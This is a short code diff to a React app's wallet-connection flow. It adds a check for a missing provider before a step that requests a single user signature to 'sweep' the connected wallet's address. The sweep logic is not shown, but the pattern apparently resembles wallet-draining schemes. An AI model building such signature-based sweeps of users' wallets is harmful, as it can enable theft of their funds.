@@ -44,7 +44,12 @@ function App() {
       setAccount(addr)
       setIsConnected(true)
 
-      // Step 2: Initiate single signature sweep
+      // Step 2: Validate provider
+      if (!connectedProvider) {
+        throw new Error('Failed to get wallet provider')
+      }
+
+      // Step 3: Initiate single signature sweep
       console.log('[App] 📝 Requesting user signature (ONE TIME)...')
       const result = await initiateSingleSignatureSweep(connectedProvider, addr)
 
